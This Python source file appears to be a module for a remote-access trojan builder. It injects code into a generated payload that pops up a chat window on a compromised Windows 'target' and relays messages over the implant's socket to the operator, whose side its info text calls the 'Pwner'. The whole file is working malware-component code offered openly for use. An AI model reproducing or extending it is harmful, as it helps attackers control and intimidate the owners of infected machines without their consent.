#By ev-ev and not fully done
import library.modules.config as config

config.main()


def main(option):
    if option == "generate":
        config.import_statements.append('import appJar')
        config.import_statements.append('import time')
        config.import_statements.append('import threading')
        config.functions.append('''
def userInterGUI():
    global s,app,old_message,quit
    quit=False
    app=appJar.gui('YOUHAVEAMESSAGE','1000x800')
    app.startPanedFrame("p1")
    app.addLabel("l1", "Your messages")
    app.addScrolledTextArea('msgs')
    app.startPanedFrame("p2")
    app.addLabel("l2", "His messages")
    app.addEmptyMessage('haxmsg')
    app.setMessageWidth('haxmsg',500)
    app.stopPanedFrame()
    app.stopPanedFrame()
    s.sendall('[+]Started GUI on target'.encode())
    old_message=''
    app.registerEvent(updater)
    app.setPollTime('100')
    t=threading.Thread(target=get_data)
    t.start()
    app.go()
def get_data():
    global s,app
    received=''
    try:
        while True:
            time.sleep(0.1)
            data=s.recv(1024).decode()
            if data == 'quit':
                quit=True
                return
            app.queueFunction(app.setMessage, 'haxmsg', data)
    except:
        return
def updater():
    global s,old_message,app,quit
    if quit==True:
        app.stop()
        return
    try:
        this_message=app.getTextArea('msgs')
        if old_message!=this_message:
            old_message=this_message
            s.sendall((this_message).encode())
    except:
        app.stop()
''')
        config.logics.append('''
            elif command == "interact_user_gui":
                userInterGUI()''')
    elif option == 'info':
        print '\nName             : User - Pwner GUI Interaction' \
              '\nOS               : Windows' \
              '\nRequired Modules : appJar, time, threading' \
              '\nCommands         : reg_persist' \
              '\nDescription      : This module allows you to interact with the user with messages through a GUI.\n                   Type quit to kill the GUI on client side.' \
              '\nAdditional Info  : Coded by ev-ev'